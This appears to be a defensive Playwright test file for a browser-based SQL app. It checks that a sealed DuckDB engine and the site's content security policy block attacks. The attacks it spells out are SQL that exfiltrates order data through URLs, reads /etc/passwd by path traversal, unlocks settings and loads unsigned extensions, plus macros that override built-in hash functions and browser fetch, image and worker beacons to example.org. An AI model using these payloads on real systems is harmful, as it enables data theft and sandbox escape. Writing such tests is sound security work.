import { expect, test } from './fixtures'
import { openDemo, recordEgress, runSql } from './helpers'

/** Queries an attacker might get a user to paste. Every one must fail without any network request. */
const ATTACKS: [string, string, RegExp][] = [
  ['read a URL', "SELECT * FROM read_csv('https://example.org/leak.csv')", /disabled by configuration/],
  [
    'leak data in a URL via a variable',
    "SET VARIABLE u = 'https://example.org/x?d=' || (SELECT string_agg(customer, ',') FROM (FROM orders LIMIT 5)); SELECT * FROM read_csv(getvariable('u'))",
    /disabled by configuration/,
  ],
  ['attach a remote database', "ATTACH 'https://example.org/x.duckdb' AS x", /disabled by configuration/],
  ['copy results to a URL', "COPY (SELECT * FROM orders LIMIT 5) TO 'https://example.org/up.csv'", /disabled by configuration/],
  ['re-enable external access', 'SET enable_external_access = true', /locked/],
  ['unlock the configuration', 'SET lock_configuration = false', /locked/],
  ['widen allowed directories', "SET allowed_directories = ['https://']", /locked/],
  ['load a remote extension', "INSTALL httpfs FROM 'https://example.org/ext'; LOAD httpfs", /disabled/],
  ['allow unsigned extensions', 'SET allow_unsigned_extensions = true', /locked/],
  ['path traversal', "SELECT * FROM read_csv_auto('/sheetah/../etc/passwd')", /disabled by configuration/],
  ['read outside the sandbox', "SELECT * FROM read_text('/etc/hosts')", /disabled by configuration/],
  ['read from cloud storage', "SELECT * FROM read_csv('s3://example-bucket/leak.csv')", /disabled by configuration/],
  ['leak data inside a URL', "SET VARIABLE leak = (SELECT 'https://example.org/?d=' || count(*) FROM orders); SELECT * FROM read_text(getvariable('leak'))", /disabled by configuration/],
]

test.describe('sealed engine', () => {
  test('every exfiltration attempt fails with zero outbound requests', async ({ page }) => {
    const egress = recordEgress(page)
    await openDemo(page)
    for (const [name, sql, expected] of ATTACKS) {
      await runSql(page, sql)
      await expect(page.locator('.error-banner'), name).toContainText(expected)
      await page.locator('.error-banner .link-btn').click()
    }
    await runSql(page, 'SELECT city, count(*) FROM orders GROUP BY 1')
    await expect(page.locator('.result-meta')).toContainText('14 rows')
    expect(egress).toEqual([])
  })
})

test.describe('functions SQL can’t redefine', () => {
  test('a macro named for a built-in (sha256 as md5) or for Sheetah’s own is removed, and said so', async ({ page }) => {
    await openDemo(page)
    // What a hostile shared query could slip in to make Anonymize's pseudonyms plain hashes.
    await runSql(page, 'CREATE OR REPLACE TEMP MACRO sha256(x) AS md5(x); CREATE FUNCTION main.lower(x) AS upper(x); SELECT 1 AS one')
    await expect(page.locator('.error-banner')).toContainText('doesn’t let a script redefine')
    await expect(page.locator('.error-banner')).toContainText('sha256')
    await page.locator('.error-banner .link-btn').click()
    await runSql(page, "SELECT sha256('a') = 'ca978112ca1bbdcafac231b39a23dc4da786eff8147c4e72b9807785afee48bb' AS real, lower('A') AS l")
    await expect(page.locator('.sr-grid [role=row]').nth(1)).toContainText('true')
    await expect(page.locator('.sr-grid [role=row]').nth(1)).toContainText('a')
    // Its own clean-up macros too: put back, whatever was written over them.
    await runSql(page, "CREATE OR REPLACE TEMP MACRO number_from_text(x) AS 0; SELECT number_from_text('1,200') AS n")
    await expect(page.locator('.error-banner')).toContainText('number_from_text')
    await page.locator('.error-banner .link-btn').click()
    await runSql(page, "SELECT number_from_text('1,200') AS n")
    await expect(page.locator('.sr-grid [role=row]').nth(1)).toContainText('1,200')
    // A catalog function of its own name can't hide one: the catalog is read by its system name.
    await runSql(
      page,
      'CREATE TEMP MACRO duckdb_functions() AS TABLE SELECT NULL::VARCHAR database_name, NULL::VARCHAR schema_name, NULL::VARCHAR function_name, NULL::VARCHAR function_type, false internal WHERE false; CREATE TEMP MACRO "right"(s, n) AS s; SELECT 1',
    )
    await expect(page.locator('.error-banner')).toContainText('right')
    await page.locator('.error-banner .link-btn').click()
    await runSql(page, "SELECT right('9820012345', 4) AS r")
    await expect(page.locator('.sr-grid [role=row]').nth(1)).toContainText('2345')
    // Nor does a comment that mentions one: nothing was made, nothing is said.
    await runSql(page, 'SELECT 1 AS x -- the function title_case tidies names')
    await expect(page.locator('.error-banner')).toHaveCount(0)
  })
})

test.describe('content security policy', () => {
  test('production headers are served', async ({ request }) => {
    const res = await request.get('/')
    const h = res.headers()
    expect(h['content-security-policy']).toContain("connect-src 'self'")
    expect(h['content-security-policy']).not.toContain("'unsafe-eval'")
    expect(h['cross-origin-opener-policy']).toBe('same-origin')
    expect(h['x-content-type-options']).toBe('nosniff')
    expect(h['referrer-policy']).toBe('no-referrer')
  })

  test('the browser blocks other origins even if code tries', async ({ page }) => {
    const egress = recordEgress(page)
    await page.goto('/')
    const r = await page.evaluate(async () => {
      const res: Record<string, string> = {}
      try {
        await fetch('https://example.org/?d=1')
        res.fetch = 'sent'
      } catch {
        res.fetch = 'blocked'
      }
      res.img = await new Promise((ok) => {
        const i = new Image()
        i.onload = () => ok('loaded')
        i.onerror = () => ok('blocked')
        i.src = 'https://example.org/p.gif?d=2'
      })
      res.worker = await new Promise((ok) => {
        const w = new Worker(URL.createObjectURL(new Blob([`fetch('https://example.org/?d=3').then(()=>postMessage('sent'),()=>postMessage('blocked'))`])))
        w.onmessage = (e) => ok(e.data)
        setTimeout(() => ok('timeout'), 4000)
      })
      try {
        new Function('return 1')()
        res.eval = 'allowed'
      } catch {
        res.eval = 'blocked'
      }
      return res
    })
    expect(r).toEqual({ fetch: 'blocked', img: 'blocked', worker: 'blocked', eval: 'blocked' })
    expect(egress).toEqual([])
  })
})
